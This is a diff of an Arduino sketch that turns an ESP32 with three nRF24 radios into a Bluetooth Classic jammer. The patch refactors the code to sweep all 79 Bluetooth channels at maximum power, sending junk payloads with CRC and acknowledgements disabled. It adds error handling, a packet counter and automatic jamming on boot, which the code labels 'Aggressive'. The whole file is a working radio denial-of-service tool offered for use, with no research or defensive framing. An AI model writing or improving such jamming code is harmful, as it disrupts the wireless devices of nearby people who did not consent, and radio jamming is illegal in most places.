@@ -2,6 +2,14 @@
  * esp32-nrf24-bt-jammer.ino
  * Bluetooth Classic Jammer – Auto‑start on boot.
  * Commands: start, stop, status, toggle, help
+ *
+ * Features:
+ * - Dynamic channel generation (no static tables)
+ * - Proper radio init with error handling
+ * - Blocking transmit with txStandBy(timeout)
+ * - Packet counter (volatile, no mutex needed)
+ * - Lower task priority (10) for stability
+ * - Clean shutdown with forced fallback
  */
 
 #include <Arduino.h>
@@ -12,124 +20,121 @@
 #include <esp_rom_sys.h>
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
-#include <freertos/semphr.h>
 
-#define NRF_CE_PIN_A  4
-#define NRF_CSN_PIN_A 5
-#define NRF_CE_PIN_B  6
-#define NRF_CSN_PIN_B 7
-#define NRF_CE_PIN_C  8
-#define NRF_CSN_PIN_C 9
+// ─── Pin Definitions ──────────────────────────────────────
+#define NRF_CE_PIN_A   4
+#define NRF_CSN_PIN_A  5
+#define NRF_CE_PIN_B   6
+#define NRF_CSN_PIN_B  7
+#define NRF_CE_PIN_C   8
+#define NRF_CSN_PIN_C  9
 
+// ─── RF24 Objects ──────────────────────────────────────────
 static RF24 RadioA(NRF_CE_PIN_A, NRF_CSN_PIN_A);
 static RF24 RadioB(NRF_CE_PIN_B, NRF_CSN_PIN_B);
 static RF24 RadioC(NRF_CE_PIN_C, NRF_CSN_PIN_C);
 
-static const uint8_t oddChannels[] = {
-  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
-  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
-  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
-  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
-  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
-  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63
-};
+// ─── Jamming Parameters ────────────────────────────────────
+static const uint8_t CH_MIN = 0;
+static const uint8_t CH_MAX = 78;
+static const uint8_t PAYLOAD_SIZE = 32;
+static const uint32_t TX_DELAY_US = 180;   // micro seconds between cycles
 
-static const uint8_t evenChannels[] = {
-  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
-  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
-  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
-  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
-  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
-  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
-  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40
-};
-
-static const uint8_t mixedChannels[] = {
-  40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,10,12,
-  4,6,8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,1,3,
-  5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,2,4,6,
-  8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,1,3,5,7,
-  9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,2,4,6,8,10,
-  12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,1,3,5,7,9,11,
-  13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,44,45,46,47
-};
-
+// ─── Global State ──────────────────────────────────────────
 static volatile bool _btActive = false;
 static volatile bool _btStopping = false;
-static volatile uint16_t _btIndex = 0;
-static SemaphoreHandle_t _btSpiMutex = NULL;
+static volatile uint32_t _btPacketCount = 0;
 static TaskHandle_t _btJammerTaskHandle = NULL;
-static uint8_t _junk[32];
-static size_t _channelCount = 0;
+static uint8_t _junk[PAYLOAD_SIZE];
 
-static void _configRadio(RF24& radio) {
-  radio.begin();
+// ─── Radio Initialisation ──────────────────────────────────
+static bool initRadio(RF24& radio) {
+  if (!radio.begin()) return false;
   radio.setAutoAck(false);
   radio.setCRCLength(RF24_CRC_DISABLED);
   radio.setDataRate(RF24_2MBPS);
   radio.setPALevel(RF24_PA_MAX);
-  radio.setPayloadSize(32);
+  radio.setPayloadSize(PAYLOAD_SIZE);
   radio.stopListening();
+  radio.flush_tx();
+  return true;
 }
 
-static void _btJammerTask(void* pv) {
+// ─── Jamming Task ──────────────────────────────────────────
+static void jammerTask(void* pv) {
   #if CONFIG_IDF_TARGET_ESP32
     esp_task_wdt_delete(NULL);
   #endif
 
-  for(int i = 0; i < 32; i++) _junk[i] = (i % 2 == 0) ? 0xAA : 0x55;
-  bool wasActive = false;
+  // Prepare junk payload
+  for (int i = 0; i < PAYLOAD_SIZE; i++) {
+    _junk[i] = (i % 2 == 0) ? 0xAA : 0x55;
+  }
+
+  uint8_t chA = CH_MIN;
+  uint8_t chB = CH_MAX;
+  uint8_t chC = CH_MIN + 26;   // spread across band
+
+  bool powered = false;
 
   while (!_btStopping) {
     if (!_btActive) {
-      if (wasActive) {
-        RadioA.powerDown();
-        RadioB.powerDown();
-        RadioC.powerDown();
-        wasActive = false;
-      }
-      vTaskDelay(pdMS_TO_TICKS(10));
+      vTaskDelay(pdMS_TO_TICKS(50));
       continue;
     }
 
-    if (!wasActive) {
+    // Power up and initialise radios once
+    if (!powered) {
       RadioA.powerUp();
       RadioB.powerUp();
       RadioC.powerUp();
-      _configRadio(RadioA);
-      _configRadio(RadioB);
-      _configRadio(RadioC);
-      RadioA.stopListening();
-      RadioB.stopListening();
-      RadioC.stopListening();
-      wasActive = true;
+
+      if (initRadio(RadioA) && initRadio(RadioB) && initRadio(RadioC)) {
+        powered = true;
+      } else {
+        // Power down and retry later
+        RadioA.powerDown();
+        RadioB.powerDown();
+        RadioC.powerDown();
+        _btActive = false;
+        vTaskDelay(pdMS_TO_TICKS(100));
+        continue;
+      }
     }
 
-    if (xSemaphoreTake(_btSpiMutex, 0) == pdTRUE) {
-      RadioA.setChannel(oddChannels[_btIndex % _channelCount]);
-      RadioB.setChannel(evenChannels[_btIndex % _channelCount]);
-      RadioC.setChannel(mixedChannels[_btIndex % _channelCount]);
+    // Set channels (dynamic)
+    RadioA.setChannel(chA);
+    RadioB.setChannel(chB);
+    RadioC.setChannel(chC);
 
-      RadioA.flush_tx();
-      RadioB.flush_tx();
-      RadioC.flush_tx();
+    // Flush TX FIFO
+    RadioA.flush_tx();
+    RadioB.flush_tx();
+    RadioC.flush_tx();
 
-      RadioA.writeFast(_junk, 32, 1);
-      esp_rom_delay_us(5);
-      RadioB.writeFast(_junk, 32, 1);
-      esp_rom_delay_us(5);
-      RadioC.writeFast(_junk, 32, 1);
-      esp_rom_delay_us(5);
+    // Transmit
+    bool okA = RadioA.writeFast(_junk, PAYLOAD_SIZE);
+    bool okB = RadioB.writeFast(_junk, PAYLOAD_SIZE);
+    bool okC = RadioC.writeFast(_junk, PAYLOAD_SIZE);
 
-      _btIndex++;
-      xSemaphoreGive(_btSpiMutex);
-    } else {
-      _btIndex++;
-    }
+    // Wait for all to finish (with 10ms timeout to avoid hanging)
+    RadioA.txStandBy(10);   // 🔥 timeout added
+    RadioB.txStandBy(10);
+    RadioC.txStandBy(10);
 
-    esp_rom_delay_us(135);
+    // Count successes
+    _btPacketCount += (okA ? 1 : 0) + (okB ? 1 : 0) + (okC ? 1 : 0);
+
+    // Update channels (smoothly cover 0–78)
+    chA = (chA + 2) % (CH_MAX + 1);
+    chB = (chB - 2 + (CH_MAX + 1)) % (CH_MAX + 1);
+    chC = (chC + 3) % (CH_MAX + 1);
+
+    // Main loop delay (adjustable – affects aggression)
+    esp_rom_delay_us(TX_DELAY_US);
   }
 
+  // Cleanup
   RadioA.powerDown();
   RadioB.powerDown();
   RadioC.powerDown();
@@ -144,82 +149,107 @@ static void _btJammerTask(void* pv) {
   vTaskDelete(NULL);
 }
 
+// ─── Public API ────────────────────────────────────────────
 bool startBtJammer() {
-  if (_btJammerTaskHandle != NULL) return false;
-
-  if (_channelCount == 0) {
-    size_t minSize = sizeof(oddChannels);
-    if (sizeof(evenChannels) < minSize) minSize = sizeof(evenChannels);
-    if (sizeof(mixedChannels) < minSize) minSize = sizeof(mixedChannels);
-    _channelCount = minSize;
+  if (_btJammerTaskHandle != NULL) {
+    Serial.println("! Jammer already running");
+    return false;
   }
 
-  esp_wifi_stop();
-  esp_wifi_deinit();
-  esp_bt_controller_deinit();
-
-  if (_btSpiMutex == NULL) {
-    _btSpiMutex = xSemaphoreCreateMutex();
-    if (_btSpiMutex == NULL) return false;
+  // Deinit WiFi and BT to avoid interference
+  esp_err_t ret;
+  ret = esp_wifi_stop();
+  if (ret != ESP_OK && ret != ESP_ERR_WIFI_NOT_INIT) {
+    Serial.printf("! WiFi stop error: %d\n", ret);
   }
-
-  _configRadio(RadioA);
-  _configRadio(RadioB);
-  _configRadio(RadioC);
-  RadioA.stopListening();
-  RadioB.stopListening();
-  RadioC.stopListening();
+  ret = esp_wifi_deinit();
+  if (ret != ESP_OK && ret != ESP_ERR_WIFI_NOT_INIT) {
+    Serial.printf("! WiFi deinit error: %d\n", ret);
+  }
+  ret = esp_bt_controller_deinit();
+  if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
+    Serial.printf("! BT deinit error: %d\n", ret);
+  }
 
   _btActive = true;
   _btStopping = false;
-  _btIndex = 0;
+  _btPacketCount = 0;
 
-  BaseType_t res = xTaskCreatePinnedToCore(_btJammerTask, "bt_jammer", 4096, NULL, 24, &_btJammerTaskHandle, 0);
+  BaseType_t res = xTaskCreatePinnedToCore(
+    jammerTask,
+    "bt_jammer",
+    4096,
+    NULL,
+    10,            // priority
+    &_btJammerTaskHandle,
+    0
+  );
+
   if (res != pdPASS) {
     _btActive = false;
+    Serial.println("! Failed to create jammer task");
     return false;
   }
+
+  Serial.println("> Jammer started");
   return true;
 }
 
 bool stopBtJammer() {
-  if (_btJammerTaskHandle == NULL) return false;
+  if (_btJammerTaskHandle == NULL) {
+    Serial.println("! Jammer not running");
+    return false;
+  }
 
   _btActive = false;
   _btStopping = true;
 
   uint32_t timeout = millis() + 2000;
-  while (_btJammerTaskHandle != NULL && millis() < timeout) vTaskDelay(pdMS_TO_TICKS(10));
+  while (_btJammerTaskHandle != NULL && millis() < timeout) {
+    vTaskDelay(pdMS_TO_TICKS(10));
+  }
 
   if (_btJammerTaskHandle != NULL) {
     vTaskDelete(_btJammerTaskHandle);
     _btJammerTaskHandle = NULL;
+    Serial.println("! Forced task deletion");
   }
 
-  if (_btSpiMutex != NULL) {
-    xSemaphoreTake(_btSpiMutex, portMAX_DELAY);
-    RadioA.powerDown();
-    RadioB.powerDown();
-    RadioC.powerDown();
-    xSemaphoreGive(_btSpiMutex);
-  }
+  // (Optional) Re‑initialise WiFi and BT to restore normal operation
+  // Uncomment the block below if you want the ESP32 to be able to use WiFi/BT
+  // after stopping the jammer. Note: This may require additional setup
+  // (e.g., esp_bt_controller_enable, esp_bluedroid_enable) to fully work.
+  /*
+  Serial.println("Attempting to restore WiFi/BT...");
+  esp_bt_controller_init();
+  esp_wifi_init();
+  esp_wifi_start();
+  */
+
+  Serial.println("> Jammer stopped");
   return true;
 }
 
-bool btJammerIsActive() { return _btActive && _btJammerTaskHandle != NULL; }
-bool btJammerToggle() { return btJammerIsActive() ? stopBtJammer() : startBtJammer(); }
+bool btJammerIsActive() {
+  return _btActive && _btJammerTaskHandle != NULL;
+}
 
+bool btJammerToggle() {
+  return btJammerIsActive() ? stopBtJammer() : startBtJammer();
+}
+
+// ─── Arduino Setup / Loop ──────────────────────────────────
 void setup() {
   Serial.begin(115200);
-  delay(500);  // wait for serial monitor
-  Serial.println("\nESP32 BT Jammer – Aggressive Mode, Auto‑start");
-  Serial.println("Commands: start, stop, status, toggle, help");
+  delay(500);
 
-  // Auto‑start jamming
+  Serial.println(F("\nESP32 BT Jammer – Aggressive, Auto‑start"));
+  Serial.println(F("Commands: start, stop, status, toggle, help"));
+
   if (startBtJammer()) {
-    Serial.println("> Jamming started automatically.");
+    Serial.println(F("> Auto‑start succeeded."));
   } else {
-    Serial.println("! Failed to auto‑start. Type 'start' to try again.");
+    Serial.println(F("! Auto‑start failed. Type 'start' to retry."));
   }
 }
 
@@ -230,21 +260,20 @@ void loop() {
     cmd.toLowerCase();
 
     if (cmd == "start") {
-      if (startBtJammer()) Serial.println("> Started.");
-      else Serial.println("! Already running or error.");
+      startBtJammer();
     } else if (cmd == "stop") {
-      if (stopBtJammer()) Serial.println("> Stopped.");
-      else Serial.println("! Not running.");
+      stopBtJammer();
     } else if (cmd == "status") {
       Serial.printf("Jammer is %s\n", btJammerIsActive() ? "ACTIVE" : "INACTIVE");
+      Serial.printf("Packets sent: %u\n", _btPacketCount);
     } else if (cmd == "toggle") {
       btJammerToggle();
       Serial.printf("> Toggled. Now %s\n", btJammerIsActive() ? "ACTIVE" : "INACTIVE");
     } else if (cmd == "help") {
-      Serial.println("Commands: start, stop, status, toggle, help");
+      Serial.println(F("Commands: start, stop, status, toggle, help"));
     } else if (cmd.length() > 0) {
-      Serial.println("Unknown. Type 'help'.");
+      Serial.println(F("Unknown. Type 'help'."));
     }
   }
-  delay(10);
+  vTaskDelay(pdMS_TO_TICKS(10));
 }
